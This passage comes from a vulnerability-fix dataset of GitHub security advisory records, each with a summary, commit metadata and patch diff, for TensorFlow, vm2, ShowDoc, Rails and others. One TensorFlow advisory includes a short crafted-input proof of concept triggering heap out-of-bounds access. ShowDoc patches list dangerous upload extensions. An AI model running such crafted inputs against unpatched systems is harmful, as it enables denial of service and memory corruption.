TFLite MLIR optimizations ### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\nThis is caused by the MLIR optimization of `L2NormalizeReduceAxis` operator. The [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/compiler\/mlir\/lite\/transforms\/optimize.cc#L67-L70) unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:\n\n```cc\nbool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast<ShapedType>().getRank() - 1 ==\n          *axis.getValues<int>().begin() ||\n      *axis.getValues<int>().begin() == -1) {\n      \/\/ ...\n  }\n  \/\/ ...\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [d6b57f461b39fd1aa8c1b870f1b974aac3554955](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6b57f461b39fd1aa8c1b870f1b974aac3554955).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n          \n### Attribution              \nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d6b57f461b39fd1aa8c1b870f1b974aac3554955","commit_sha":"d6b57f461b39fd1aa8c1b870f1b974aac3554955","patch":"SINGLE","chain_ord":"['d6b57f461b39fd1aa8c1b870f1b974aac3554955']","before_first_fix_commit":"{'c26b15e7565e4f50ad6ea25b09127a019ad77c14'}","last_fix_commit":"d6b57f461b39fd1aa8c1b870f1b974aac3554955","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 23:20:45","message":"Prevent nullptr dereference in MLIR TFLite dialect\/optimizer.\n\nPiperOrigin-RevId: 387220762\nChange-Id: Id136ef04bb3d36123b4685d316ae81a9ec924d6b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/compiler\/mlir\/lite\/transforms\/optimize.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d6b57f461b39fd1aa8c1b870f1b974aac3554955\/tensorflow%2Fcompiler%2Fmlir%2Flite%2Ftransforms%2Foptimize.cc', 'patch': '@@ -68,6 +68,9 @@ constexpr char kRelu6[] = \"RELU6\";\\n constexpr char kRelu1[] = \"RELU_N1_TO_1\";\\n \\n bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\\n+  if (axis.getNumElements() == 0) {\\n+    return false;\\n+  }\\n   if (sq_op.getType().cast<ShapedType>().getRank() - 1 ==\\n           *axis.getValues<int>().begin() ||\\n       *axis.getValues<int>().begin() == -1) {'}}","message_norm":"prevent nullptr dereference in mlir tflite dialect\/optimizer.\n\npiperorigin-revid: 387220762\nchange-id: id136ef04bb3d36123b4685d316ae81a9ec924d6b","language":"en","entities":"[('prevent', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('387220762', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/compiler\/mlir\/lite\/transforms\/optimize.cc'])","num_files":1.0},{"index":3269,"vuln_id":"GHSA-wf5x-cr3r-xr77","cwe_id":"{'CWE-674'}","score":8.3,"chain":"{'https:\/\/github.com\/patriksimek\/vm2\/commit\/4b22d704e4794af63a5a2d633385fd20948f6f90'}","dataset":"osv","summary":"vm2 before 3.6.11 vulnerable to sandbox escape This affects the package vm2 before 3.6.11. It is possible to trigger a RangeError exception from the host rather than the \"sandboxed\" context by reaching the stack call limit with an infinite recursion. The returned object is then used to reference the mainModule property of the host code running the script allowing it to spawn a child_process and execute arbitrary code.","published_date":"2022-07-14","chain_len":1,"project":"https:\/\/github.com\/patriksimek\/vm2","commit_href":"https:\/\/github.com\/patriksimek\/vm2\/commit\/4b22d704e4794af63a5a2d633385fd20948f6f90","commit_sha":"4b22d704e4794af63a5a2d633385fd20948f6f90","patch":"SINGLE","chain_ord":"['4b22d704e4794af63a5a2d633385fd20948f6f90']","before_first_fix_commit":"{'2ac8ff254a71e516e83f6496635fa61420447fa9'}","last_fix_commit":"4b22d704e4794af63a5a2d633385fd20948f6f90","chain_ord_pos":1.0,"commit_datetime":"04\/07\/2019, 23:46:03","message":"Fixes sandbox escape (#197)","author":"Patrik Simek","comments":null,"stats":"{'additions': 16, 'deletions': 16, 'total': 32}","files":"{'lib\/contextify.js': {'additions': 16, 'deletions': 16, 'changes': 32, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/patriksimek\/vm2\/raw\/4b22d704e4794af63a5a2d633385fd20948f6f90\/lib%2Fcontextify.js', 'patch': \"@@ -327,15 +327,15 @@ Decontextify.object = (object, traps, deepTraps, flags, mock) => {\\n \\treturn proxy;\\n };\\n Decontextify.value = (value, traps, deepTraps, flags, mock) => {\\n-\\tif (Contextified.has(value)) {\\n-\\t\\t\/\/ Contextified object has returned back from vm\\n-\\t\\treturn Contextified.get(value);\\n-\\t} else if (Decontextify.proxies.has(value)) {\\n-\\t\\t\/\/ Decontextified proxy already exists, reuse\\n-\\t\\treturn Decontextify.proxies.get(value);\\n-\\t}\\n-\\n \\ttry {\\n+\\t\\tif (Contextified.has(value)) {\\n+\\t\\t\\t\/\/ Contextified object has returned back from vm\\n+\\t\\t\\treturn Contextified.get(value);\\n+\\t\\t} else if (Decontextify.proxies.has(value)) {\\n+\\t\\t\\t\/\/ Decontextified proxy already exists, reuse\\n+\\t\\t\\treturn Decontextify.proxies.get(value);\\n+\\t\\t}\\n+\\n \\t\\tswitch (typeof value) {\\n \\t\\t\\tcase 'object':\\n \\t\\t\\t\\tif (value === null) {\\n@@ -621,15 +621,15 @@ Contextify.object = (object, traps, deepTraps, flags, mock) => {\\n \\treturn proxy;\\n };\\n Contextify.value = (value, traps, deepTraps, flags, mock) => {\\n-\\tif (Decontextified.has(value)) {\\n-\\t\\t\/\/ Decontextified object has returned back to vm\\n-\\t\\treturn Decontextified.get(value);\\n-\\t} else if (Contextify.proxies.has(value)) {\\n-\\t\\t\/\/ Contextified proxy already exists, reuse\\n-\\t\\treturn Contextify.proxies.get(value);\\n-\\t}\\n-\\n \\ttry {\\n+\\t\\tif (Decontextified.has(value)) {\\n+\\t\\t\\t\/\/ Decontextified object has returned back to vm\\n+\\t\\t\\treturn Decontextified.get(value);\\n+\\t\\t} else if (Contextify.proxies.has(value)) {\\n+\\t\\t\\t\/\/ Contextified proxy already exists, reuse\\n+\\t\\t\\treturn Contextify.proxies.get(value);\\n+\\t\\t}\\n+\\n \\t\\tswitch (typeof value) {\\n \\t\\t\\tcase 'object':\\n \\t\\t\\t\\tif (value === null) {\"}}","message_norm":"fixes sandbox escape (#197)","language":"ca","entities":"[('fixes', 'ACTION', ''), ('sandbox', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('#197', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/contextify.js'])","num_files":1.0},{"index":3272,"vuln_id":"GHSA-wg4r-q74r-p7c8","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/4b6e6603c714aab1de346c5f5cb0bbb4c871be1f'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc is vulnerable to stored cross-site scripting due to unrestricted file upload in versions 2.10.3 and prior. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/4b6e6603c714aab1de346c5f5cb0bbb4c871be1f","commit_sha":"4b6e6603c714aab1de346c5f5cb0bbb4c871be1f","patch":"SINGLE","chain_ord":"['4b6e6603c714aab1de346c5f5cb0bbb4c871be1f']","before_first_fix_commit":"{'d4363f73fb50193c9701982b59642696edf834a1', '61a23da1925119454d8477e9cf884b6cba93364c'}","last_fix_commit":"4b6e6603c714aab1de346c5f5cb0bbb4c871be1f","chain_ord_pos":1.0,"commit_datetime":"03\/13\/2022, 12:16:25","message":"Merge pull request #1630 from ajaysenr\/master\n\nUpdate AttachmentModel.class.php","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/4b6e6603c714aab1de346c5f5cb0bbb4c871be1f\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -305,6 +305,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n \\t\\t\\t|| $isDangerStr($filename , \".xxhtml\")\\n \\t\\t\\t|| $isDangerStr($filename , \".asp\")\\t\\t\\t\\n+\\t\\t\\t|| $isDangerStr($filename , \".xsl\")\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}'}}","message_norm":"merge pull request #1630 from ajaysenr\/master\n\nupdate attachmentmodel.class.php","language":"en","entities":"[('#1630', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":3273,"vuln_id":"GHSA-wg6g-ppvx-927h","cwe_id":"{'CWE-1321'}","score":7.3,"chain":"{'https:\/\/github.com\/ashaffer\/cached-path-relative\/commit\/40c73bf70c58add5aec7d11e4f36b93d144bb760'}","dataset":"osv","summary":"Prototype Pollution in cached-path-relative The package cached-path-relative before 1.1.0 is vulnerable to Prototype Pollution via the cache variable that is set as {} instead of Object.create(null) in the cachedPathRelative function, which allows access to the parent prototype properties when the object is used to create the cached relative path. When using the origin path as __proto__, the attribute of the object is accessed instead of a path. **Note:** This vulnerability derives from an incomplete fix in https:\/\/security.snyk.io\/vuln\/SNYK-JS-CACHEDPATHRELATIVE-72573","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/ashaffer\/cached-path-relative","commit_href":"https:\/\/github.com\/ashaffer\/cached-path-relative\/commit\/40c73bf70c58add5aec7d11e4f36b93d144bb760","commit_sha":"40c73bf70c58add5aec7d11e4f36b93d144bb760","patch":"SINGLE","chain_ord":"['40c73bf70c58add5aec7d11e4f36b93d144bb760']","before_first_fix_commit":"{'dfc753a020508cf42cde98024c68bf16bed12edc'}","last_fix_commit":"40c73bf70c58add5aec7d11e4f36b93d144bb760","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2022, 19:12:34","message":"Fix other instances of prototype pollution vulnerability","author":"Andrew","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'lib\/index.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ashaffer\/cached-path-relative\/raw\/40c73bf70c58add5aec7d11e4f36b93d144bb760\/lib%2Findex.js', 'patch': '@@ -27,15 +27,15 @@ function cachedPathRelative (from, to) {\\n   \/\/ to invalidate the cache\\n   var cwd = process.cwd()\\n   if (cwd !== lastCwd) {\\n-    cache = {}\\n+    cache = Object.create(null)\\n     lastCwd = cwd\\n   }\\n \\n   if (cache[from] && cache[from][to]) return cache[from][to]\\n \\n   var result = relative.call(path, from, to)\\n \\n-  cache[from] = cache[from] || {}\\n+  cache[from] = cache[from] || Object.create(null)\\n   cache[from][to] = result\\n \\n   return result'}}","message_norm":"fix other instances of prototype pollution vulnerability","language":"en","entities":"[('fix', 'ACTION', ''), ('prototype pollution', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":3274,"vuln_id":"GHSA-wg8p-w946-c482","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/56e450c3adf75c707500d7231a78c9fc894c7f13'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc prior to 2.10.4 is vulnerable to stored cross-site scripting via file upload.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/56e450c3adf75c707500d7231a78c9fc894c7f13","commit_sha":"56e450c3adf75c707500d7231a78c9fc894c7f13","patch":"SINGLE","chain_ord":"['56e450c3adf75c707500d7231a78c9fc894c7f13']","before_first_fix_commit":"{'237ac6d43bf3728bf3587c486a23b4a48ea7acb3'}","last_fix_commit":"56e450c3adf75c707500d7231a78c9fc894c7f13","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 12:15:13","message":"file upload bug","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/56e450c3adf75c707500d7231a78c9fc894c7f13\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': \"@@ -329,7 +329,7 @@ public function isAllowedFilename($filename){\\n \\t\\t\\t'.zip','.tar','.gz','.tgz','.ipa','.apk','.rar','.iso','.bz2','.epub',\\n \\t\\t\\t'.pdf','.ofd','.swf','.epub','.xps',\\n \\t\\t\\t'.doc','.docx','.odt','.rtf','.docm','.dotm','.dot','.dotx','.wps','.wpt',\\n-\\t\\t\\t'.ppt','.pptx','.xls','.xlsx','.txt','.md','.psd','.csv',\\n+\\t\\t\\t'.ppt','.pptx','.xls','.xlsx','.txt','.psd','.csv',\\n \\t\\t\\t'.cer','.ppt','.pub','.properties','.json','.css',\\n \\t\\t\\t) ;\"}}","message_norm":"file upload bug","language":"ro","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":3276,"vuln_id":"GHSA-wgx2-6432-j3fw","cwe_id":"{'CWE-704'}","score":9.8,"chain":"{'https:\/\/github.com\/paritytech\/bigint\/commit\/7e71521a61b009afc94c91135353102658550d42'}","dataset":"osv","summary":"Unsoundness in bigint An issue was discovered in the bigint crate through 2020-05-07 for Rust. It allows a soundness violation.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/paritytech\/bigint","commit_href":"https:\/\/github.com\/paritytech\/bigint\/commit\/7e71521a61b009afc94c91135353102658550d42","commit_sha":"7e71521a61b009afc94c91135353102658550d42","patch":"SINGLE","chain_ord":"['7e71521a61b009afc94c91135353102658550d42']","before_first_fix_commit":"{'ae4bc3b51d3718abafa89837730e23bd718c6b02'}","last_fix_commit":"7e71521a61b009afc94c91135353102658550d42","chain_ord_pos":1.0,"commit_datetime":"05\/07\/2020, 13:12:33","message":"DEPRECATED: bump to 4.4.3 to update crates.io readme","author":"Andronik Ordian","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'Cargo.toml': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/paritytech\/bigint\/raw\/7e71521a61b009afc94c91135353102658550d42\/Cargo.toml', 'patch': '@@ -1,11 +1,12 @@\\n [package]\\n-description = \"Large fixed-size integers arithmetics\"\\n+description = \"DEPRECATED: use uint instead\"\\n homepage = \"http:\/\/parity.io\"\\n repository = \"https:\/\/github.com\/ethcore\/bigint\"\\n license = \"MIT\/Apache-2.0\"\\n name = \"bigint\"\\n-version = \"4.4.2\"\\n+version = \"4.4.3\"\\n authors = [\"Parity Technologies <admin@parity.io>\"]\\n+readme = \"README.md\"\\n \\n [dependencies]\\n rustc-hex = { version = \"1.0\", optional = true }'}}","message_norm":"deprecated: bump to 4.4.3 to update crates.io readme","language":"en","entities":"[('4.4.3', 'VERSION', ''), ('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Cargo.toml'])","num_files":1.0},{"index":3279,"vuln_id":"GHSA-wh98-p28r-vrc9","cwe_id":"{'CWE-200'}","score":7.4,"chain":"{'https:\/\/github.com\/rails\/rails\/commit\/f9a2ad03943d5c2ba54e1d45f155442b519c75da'}","dataset":"osv","summary":"Exposure of information in Action Pack ### Impact\n\nUnder certain circumstances response bodies will not be closed, for example a [bug in a webserver](https:\/\/github.com\/puma\/puma\/pull\/2812) or a bug in a Rack middleware.  In the event a response is *not* notified of a `close`, `ActionDispatch::Executor` will not know to reset thread local state for the next request.  This can lead to data being leaked to subsequent requests, especially when interacting with `ActiveSupport::CurrentAttributes`.\n\nUpgrading to the FIXED versions of Rails will ensure mitigation of this issue even in the context of a buggy webserver or middleware implementation.\n\n### Patches\n\nThis has been fixed in Rails 7.0.2.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.\n\n### Workarounds\n\nUpgrading is highly recommended, but to work around this problem the following middleware can be used:\n\n```ruby\nclass GuardedExecutor < ActionDispatch::Executor\n  def call(env)\n    ensure_completed!\n    super\n  end\n\n  private\n\n    def ensure_completed!\n      @executor.new.complete! if @executor.active?\n    end\nend\n\n# Ensure the guard is inserted before ActionDispatch::Executor\nRails.application.configure do\n  config.middleware.swap ActionDispatch::Executor, GuardedExecutor, executor\nend\n```","published_date":"2022-02-11","chain_len":1,"project":"https:\/\/github.com\/rails\/rails","commit_href":"https:\/\/github.com\/rails\/rails\/commit\/f9a2ad03943d5c2ba54e1d45f155442b519c75da","commit_sha":"f9a2ad03943d5c2ba54e1d45f155442b519c75da","patch":"SINGLE","chain_ord":"['f9a2ad03943d5c2ba54e1d45f155442b519c75da']","before_first_fix_commit":"{'761a2e25520566d932c41c740b8a5c513d839de8'}","last_fix_commit":"f9a2ad03943d5c2ba54e1d45f155442b519c75da","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2022, 19:23:01","message":"Fix reloader to work with new Executor signature\n\nThis is a follow up to [CVE-2022-23633].","author":"Aaron Patterson","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'activesupport\/lib\/active_support\/reloader.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rails\/rails\/raw\/f9a2ad03943d5c2ba54e1d45f155442b519c75da\/activesupport%2Flib%2Factive_support%2Freloader.rb', 'patch': '@@ -58,7 +58,7 @@ def self.reload!\\n       prepare!\\n     end\\n \\n-    def self.run! # :nodoc:\\n+    def self.run!(reset: false) # :nodoc:\\n       if check!\\n         super\\n       else'}}","message_norm":"fix reloader to work with new executor signature\n\nthis is a follow up to [cve-2022-23633].","language":"en","entities":"[('fix', 'ACTION', ''), ('signature', 'SECWORD', ''), ('cve-2022-23633', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['activesupport\/lib\/active_support\/reloader.rb'])","num_files":1.0},{"index":3281,"vuln_id":"GHSA-whr9-vfh2-7hm6","cwe_id":"{'CWE-787'}","score":4.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517'}","dataset":"osv","summary":"Memory corruption in `DrawBoundingBoxesV2` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\nimages = tf.fill([10, 96, 0, 1], 0.)\nboxes = tf.fill([10, 53, 0], 0.)\ncolors = tf.fill([0, 1], 0.)\n\ntf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/31bd5026304677faa8a0b77602c6154171b9aec1\/tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc#L116-L130) assumes that the last element of `boxes` input is 4, as required by [the op](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/DrawBoundingBoxesV2). Since this is not checked attackers passing values less than 4 can write outside of bounds of heap allocated objects and cause memory corruption:\n\n```cc \nconst auto tboxes = boxes.tensor<T, 3>();\nfor (int64 bb = 0; bb < num_boxes; ++bb) {\n  ...\n  const int64 min_box_row = static_cast<float>(tboxes(b, bb, 0)) * (height - 1);\n  const int64 max_box_row = static_cast<float>(tboxes(b, bb, 2)) * (height - 1);\n  const int64 min_box_col = static_cast<float>(tboxes(b, bb, 1)) * (width - 1);\n  const int64 max_box_col = static_cast<float>(tboxes(b, bb, 3)) * (width - 1);\n  ...\n}\n``` \n\nIf the last dimension in `boxes` is less than 4, accesses similar to `tboxes(b, bb, 3)` will access data outside of bounds. Further during code execution there are also writes to these indices.\n\n### Patches\nWe have patched the issue in GitHub commit [79865b542f9ffdc9caeb255631f7c56f1d4b6517](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/79865b542f9ffdc9caeb255631f7c56f1d4b6517","commit_sha":"79865b542f9ffdc9caeb255631f7c56f1d4b6517","patch":"SINGLE","chain_ord":"['79865b542f9ffdc9caeb255631f7c56f1d4b6517']","before_first_fix_commit":"{'31bd5026304677faa8a0b77602c6154171b9aec1'}","last_fix_commit":"79865b542f9ffdc9caeb255631f7c56f1d4b6517","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 01:05:46","message":"Fix memory corruption issue with `tf.raw_ops.DrawBoundingBoxesV2`.\n\nPiperOrigin-RevId: 372033910\nChange-Id: I8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d","author":"Amit Patankar","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/79865b542f9ffdc9caeb255631f7c56f1d4b6517\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdraw_bounding_box_op.cc', 'patch': '@@ -73,6 +73,12 @@ class DrawBoundingBoxesOp : public OpKernel {\\n         errors::InvalidArgument(\"Channel depth should be either 1 (GRY), \"\\n                                 \"3 (RGB), or 4 (RGBA)\"));\\n \\n+    OP_REQUIRES(\\n+        context, boxes.dim_size(2) == 4,\\n+        errors::InvalidArgument(\\n+            \"The size of the third dimension of the box must be 4. Received: \",\\n+            boxes.dim_size(2)));\\n+\\n     const int64 batch_size = images.dim_size(0);\\n     const int64 height = images.dim_size(1);\\n     const int64 width = images.dim_size(2);'}}","message_norm":"fix memory corruption issue with `tf.raw_ops.drawboundingboxesv2`.\n\npiperorigin-revid: 372033910\nchange-id: i8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d","language":"en","entities":"[('fix', 'ACTION', ''), ('memory corruption', 'SECWORD', ''), ('issue', 'FLAW', ''), ('372033910', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/draw_bounding_box_op.cc'])","num_files":1.0},{"index":3283,"vuln_id":"GHSA-whv6-rj84-2vh2","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/juliushaertl\/nextcloud-vue-collections\/commit\/8ec1fca214f003538cec4137792ede928f25f583'}","dataset":"osv","summary":"Cross-Site Scripting in nextcloud-vue-collections Versions of `nextcloud-vue-collections` prior to 0.4.2 are vulnerable to Cross-Site Scripting (XSS).  The `v-tooltip` component has an insecure `defaultHTML` configuration that allows arbitrary JavaScript to be injected in the tooltip of a collection item. This allows attackers to execute arbitrary code in a victim's browser.\n\n\n## Recommendation\n\nUpgrade to version 0.4.2 or later.","published_date":"2020-09-04","chain_len":1,"project":"https:\/\/github.com\/juliushaertl\/nextcloud-vue-collections","commit_href":"https:\/\/github.com\/juliushaertl\/nextcloud-vue-collections\/commit\/8ec1fca214f003538cec4137792ede928f25f583","commit_sha":"8ec1fca214f003538cec4137792ede928f25f583","patch":"SINGLE","chain_ord":"['8ec1fca214f003538cec4137792ede928f25f583']","before_first_fix_commit":"{'1d55cc3b462bc344de6cfbe45d590d0c2f99fc1a'}","last_fix_commit":"8ec1fca214f003538cec4137792ede928f25f583","chain_ord_pos":1.0,"commit_datetime":"07\/29\/2019, 13:41:42","message":"Force defaultHtml setting of v-tooltip to be disabled\n\nSigned-off-by: Julius H\u00e4rtl <jus@bitgrid.net>","author":"Julius H\u00e4rtl","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'src\/components\/CollectionListItem.vue': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nextcloud\/nextcloud-vue-collections\/raw\/8ec1fca214f003538cec4137792ede928f25f583\/src%2Fcomponents%2FCollectionListItem.vue', 'patch': \"@@ -60,6 +60,9 @@ import Action from 'nextcloud-vue\/dist\/Components\/Action'\\n import Avatar from 'nextcloud-vue\/dist\/Components\/Avatar'\\n import Tooltip from 'nextcloud-vue\/dist\/Directives\/Tooltip'\\n \\n+Tooltip.options.defaultHtml = false\\n+\\n+\\n export default {\\n \\tname: 'CollectionListItem',\\n \\tcomponents: {\"}}","message_norm":"force defaulthtml setting of v-tooltip to be disabled\n\nsigned-off-by: julius h\u00e4rtl <jus@bitgrid.net>","language":"en","entities":"[('jus@bitgrid.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/components\/CollectionListItem.vue'])","num_files":1.0},{"index":3286,"vuln_id":"GHSA-wjh9-344g-vc49","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/francoisjacquet\/rosariosis\/commit\/6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8'}","dataset":"osv","summary":"Cross-site Scripting in RosarioSIS Cross-site Scripting (XSS) - Stored in GitHub repository francoisjacquet\/rosariosis prior to 9.0.","published_date":"2022-06-09","chain_len":1,"project":"https:\/\/github.com\/francoisjacquet\/rosariosis","commit_href":"https:\/\/github.com\/francoisjacquet\/rosariosis\/commit\/6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8","commit_sha":"6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8","patch":"SINGLE","chain_ord":"['6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8']","before_first_fix_commit":"{'25eb3196e26df31917dfef87aa9f66f78c1646ea'}","last_fix_commit":"6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8","chain_ord_pos":1.0,"commit_datetime":"06\/04\/2022, 11:44:21","message":"Fix stored XSS security issue: remove inline JS from URL in PreparePHP_SELF.fnc.php","author":"Fran\u00e7ois Jacquet","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'functions\/PreparePHP_SELF.fnc.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/francoisjacquet\/rosariosis\/raw\/6b22c0b5b40fad891c8cf9e7eeff3e42a35c0bf8\/functions%2FPreparePHP_SELF.fnc.php', 'patch': \"@@ -200,7 +200,7 @@ function( $match ) {\\n \\n \\tforeach ( $remove as $remove_string )\\n \\t{\\n-\\t\\twhile ( strpos( $string, $remove_string ) !== false )\\n+\\t\\twhile ( stripos( $string, $remove_string ) !== false )\\n \\t\\t{\\n \\t\\t\\t$string = str_ireplace( $remove, '', $string );\\n \\t\\t}\"}}","message_norm":"fix stored xss security issue: remove inline js from url in preparephp_self.fnc.php","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['functions\/PreparePHP_SELF.fnc.php'])","num_files":1.0},{"index":3293,"vuln_id":"GHSA-wm7h-9275-46v2","cwe_id":"{'CWE-248'}","score":7.5,"chain":"{'https:\/\/github.com\/mscdex\/dicer\/pull\/22\/commits\/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac'}","dataset":"osv","summary":"Crash in HeaderParser in dicer This affects all versions of package dicer. A malicious attacker can send a modified form to server, and crash the nodejs service. A complete denial of service can be achived by sending the malicious form in a 